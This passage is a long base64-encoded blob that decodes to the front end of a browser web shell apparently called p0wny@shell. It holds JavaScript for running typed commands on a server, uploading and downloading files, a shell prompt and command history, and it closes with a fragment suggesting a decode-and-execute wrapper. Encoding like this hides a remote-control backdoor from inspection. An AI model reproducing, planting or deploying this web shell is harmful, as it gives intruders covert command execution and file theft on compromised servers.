SBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CiAgICAgICAgICAgICAgICBlbGVtZW50LnNldEF0dHJpYnV0ZSgnaHJlZicsICdkYXRhOmFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbTtiYXNlNjQsJyArIGZpbGUpOwogICAgICAgICAgICAgICAgZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2Rvd25sb2FkJywgbmFtZSk7CiAgICAgICAgICAgICAgICBlbGVtZW50LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGVsZW1lbnQpOwogICAgICAgICAgICAgICAgZWxlbWVudC5jbGljaygpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChlbGVtZW50KTsKICAgICAgICAgICAgICAgIF9pbnNlcnRTdGRvdXQoJ0RvbmUuJyk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGZlYXR1cmVVcGxvYWQocGF0aCkgewogICAgICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwogICAgICAgICAgICAgICAgZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ3R5cGUnLCAnZmlsZScpOwogICAgICAgICAgICAgICAgZWxlbWVudC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KTsKICAgICAgICAgICAgICAgIGVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHZhciBwcm9taXNlID0gZ2V0QmFzZTY0KGVsZW1lbnQuZmlsZXNbMF0pOwogICAgICAgICAgICAgICAgICAgIHByb21pc2UudGhlbihmdW5jdGlvbiAoZmlsZSkgewogICAgICAgICAgICAgICAgICAgICAgICBtYWtlUmVxdWVzdCgnP2ZlYXR1cmU9dXBsb2FkJywge3BhdGg6IHBhdGgsIGZpbGU6IGZpbGUsIGN3ZDogQ1dEfSwgZnVuY3Rpb24gKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaW5zZXJ0U3Rkb3V0KGF0b2IocmVzcG9uc2Uuc3Rkb3V0KSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVDd2QoYXRvYihyZXNwb25zZS5jd2QpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBfaW5zZXJ0U3Rkb3V0KCdBbiB1bmtub3duIGNsaWVudC1zaWRlIGVycm9yIG9jY3VycmVkLicpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbGVtZW50LmNsaWNrKCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGVsZW1lbnQpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBnZXRCYXNlNjQoZmlsZSwgb25Mb2FkQ2FsbGJhY2spIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsKICAgICAgICAgICAgICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24oKSB7IHJlc29sdmUocmVhZGVyLnJlc3VsdC5tYXRjaCgvYmFzZTY0LCguKikkLylbMV0pOyB9OwogICAgICAgICAgICAgICAgICAgIHJlYWRlci5vbmVycm9yID0gcmVqZWN0OwogICAgICAgICAgICAgICAgICAgIHJlYWRlci5yZWFkQXNEYXRhVVJMKGZpbGUpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGdlblByb21wdChjd2QpIHsKICAgICAgICAgICAgICAgIGN3ZCA9IGN3ZCB8fCAifiI7CiAgICAgICAgICAgICAgICB2YXIgc2hvcnRDd2QgPSBjd2Q7CiAgICAgICAgICAgICAgICBpZiAoY3dkLnNwbGl0KCIvIikubGVuZ3RoID4gMykgewogICAgICAgICAgICAgICAgICAgIHZhciBzcGxpdHRlZEN3ZCA9IGN3ZC5zcGxpdCgiLyIpOwogICAgICAgICAgICAgICAgICAgIHNob3J0Q3dkID0gIuKApi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTJdICsgIi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTFdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIFNIRUxMX0NPTkZJR1sidXNlcm5hbWUiXSArICJAIiArIFNIRUxMX0NPTkZJR1siaG9zdG5hbWUiXSArICI6PHNwYW4gdGl0bGU9XCIiICsgY3dkICsgIlwiPiIgKyBzaG9ydEN3ZCArICI8L3NwYW4+IyI7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwZGF0ZUN3ZChjd2QpIHsKICAgICAgICAgICAgICAgIGlmIChjd2QpIHsKICAgICAgICAgICAgICAgICAgICBDV0QgPSBjd2Q7CiAgICAgICAgICAgICAgICAgICAgX3VwZGF0ZVByb21wdCgpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIG1ha2VSZXF1ZXN0KCI/ZmVhdHVyZT1wd2QiLCB7fSwgZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgICAgICBDV0QgPSBhdG9iKHJlc3BvbnNlLmN3ZCk7CiAgICAgICAgICAgICAgICAgICAgX3VwZGF0ZVByb21wdCgpOwogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBlc2NhcGVIdG1sKHN0cmluZykgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cmluZwogICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8mL2csICImYW1wOyIpCiAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLzwvZywgIiZsdDsiKQogICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8+L2csICImZ3Q7Iik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIF91cGRhdGVQcm9tcHQoKSB7CiAgICAgICAgICAgICAgICB2YXIgZVNoZWxsUHJvbXB0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNoZWxsLXByb21wdCIpOwogICAgICAgICAgICAgICAgZVNoZWxsUHJvbXB0LmlubmVySFRNTCA9IGdlblByb21wdChDV0QpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBfb25TaGVsbENtZEtleURvd24oZXZlbnQpIHsKICAgICAgICAgICAgICAgIHN3aXRjaCAoZXZlbnQua2V5KSB7CiAgICAgICAgICAgICAgICAgICAgY2FzZSAiRW50ZXIiOgogICAgICAgICAgICAgICAgICAgICAgICBmZWF0dXJlU2hlbGwoZVNoZWxsQ21kSW5wdXQudmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICBpbnNlcnRUb0hpc3RvcnkoZVNoZWxsQ21kSW5wdXQudmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICBjYXNlICJBcnJvd1VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGhpc3RvcnlQb3NpdGlvbiA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpc3RvcnlQb3NpdGlvbi0tOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQuYmx1cigpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQudmFsdWUgPSBjb21tYW5kSGlzdG9yeVtoaXN0b3J5UG9zaXRpb25dOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgX2RlZmVyKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LmZvY3VzKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICBjYXNlICJBcnJvd0Rvd24iOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeVBvc2l0aW9uID49IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaGlzdG9yeVBvc2l0aW9uKys7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoaXN0b3J5UG9zaXRpb24gPT09IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQudmFsdWUgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LmJsdXIoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LmZvY3VzKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9IGNvbW1hbmRIaXN0b3J5W2hpc3RvcnlQb3NpdGlvbl07CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY2FzZSAnVGFiJzoKICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZmVhdHVyZUhpbnQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGluc2VydFRvSGlzdG9yeShjbWQpIHsKICAgICAgICAgICAgICAgIGNvbW1hbmRIaXN0b3J5LnB1c2goY21kKTsKICAgICAgICAgICAgICAgIGhpc3RvcnlQb3NpdGlvbiA9IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gbWFrZVJlcXVlc3QodXJsLCBwYXJhbXMsIGNhbGxiYWNrKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBnZXRRdWVyeVN0cmluZygpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IFtdOwogICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGtleSBpbiBwYXJhbXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5oYXNPd25Qcm9wZXJ0eShrZXkpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLnB1c2goZW5jb2RlVVJJQ29tcG9uZW50KGtleSkgKyAiPSIgKyBlbmNvZGVVUklDb21wb25lbnQocGFyYW1zW2tleV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gYS5qb2luKCImIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB4aHIub3BlbigiUE9TVCIsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwogICAgICAgICAgICAgICAgeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGlmICh4aHIucmVhZHlTdGF0ZSA9PT0gNCAmJiB4aHIuc3RhdHVzID09PSAyMDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciByZXNwb25zZUpzb24gPSBKU09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2socmVzcG9uc2VKc29uKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJFcnJvciB3aGlsZSBwYXJzaW5nIHJlc3BvbnNlOiAiICsgZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIHhoci5zZW5kKGdldFF1ZXJ5U3RyaW5nKCkpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBkb2N1bWVudC5vbmNsaWNrID0gZnVuY3Rpb24oZXZlbnQpIHsKICAgICAgICAgICAgICAgIGV2ZW50ID0gZXZlbnQgfHwgd2luZG93LmV2ZW50OwogICAgICAgICAgICAgICAgdmFyIHNlbGVjdGlvbiA9IHdpbmRvdy5nZXRTZWxlY3Rpb24oKTsKICAgICAgICAgICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsKCiAgICAgICAgICAgICAgICBpZiAodGFyZ2V0LnRhZ05hbWUgPT09ICJTRUxFQ1QiKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICghc2VsZWN0aW9uLnRvU3RyaW5nKCkpIHsKICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC5mb2N1cygpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwoKICAgICAgICAgICAgd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic2hlbGwtY21kIik7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNoZWxsLWNvbnRlbnQiKTsKICAgICAgICAgICAgICAgIHVwZGF0ZUN3ZCgpOwogICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQuZm9jdXMoKTsKICAgICAgICAgICAgfTsKICAgICAgICA8L3NjcmlwdD4KICAgIDwvaGVhZD4KCiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGlkPSJzaGVsbCI+CiAgICAgICAgICAgIDxwcmUgaWQ9InNoZWxsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPGRpdiBpZD0ic2hlbGwtbG9nbyI+CiAgICAgICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgIF9fX18gICAgICBfICAgICAgICAgIF8gXyAgICAgICAgXyAgXyAgIDxzcGFuPjwvc3Bhbj4KIF8gX18gIC8gXyBcX18gICAgICBfX18gX18gIF8gICBfICAvIF9fIFwgX19ffCB8X18gICBfX198IHwgfF8gL1wvfHwgfHwgfF8gPHNwYW4+PC9zcGFuPgp8ICdfIFx8IHwgfCBcIFwgL1wgLyAvICdfIFx8IHwgfCB8LyAvIF9gIC8gX198ICdfIFwgLyBfIFwgfCAoXykvXC9fICAuLiAgX3w8c3Bhbj48L3NwYW4+CnwgfF8pIHwgfF98IHxcIFYgIFYgL3wgfCB8IHwgfF98IHwgfCAoX3wgXF9fIFwgfCB8IHwgIF9fLyB8IHxfICAgfF8gICAgICBffDxzcGFuPjwvc3Bhbj4KfCAuX18vIFxfX18vICBcXy9cXy8gfF98IHxffFxfXywgfFwgXF9fLF98X19fL198IHxffFxfX198X3xfKF8pICAgIHxffHxffCAgPHNwYW4+PC9zcGFuPgp8X3wgICAgICAgICAgICAgICAgICAgICAgICAgfF9fXy8gIFxfX19fLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj48L3NwYW4+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9wcmU+CiAgICAgICAgICAgIDxkaXYgaWQ9InNoZWxsLWlucHV0Ij4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InNoZWxsLWNtZCIgaWQ9InNoZWxsLXByb21wdCIgY2xhc3M9InNoZWxsLXByb21wdCI+Pz8/PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGlkPSJzaGVsbC1jbWQiIG5hbWU9ImNtZCIgb25rZXlkb3duPSJfb25TaGVsbENtZEtleURvd24oZXZlbnQpIi8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+Cgo8L2h0bWw+"));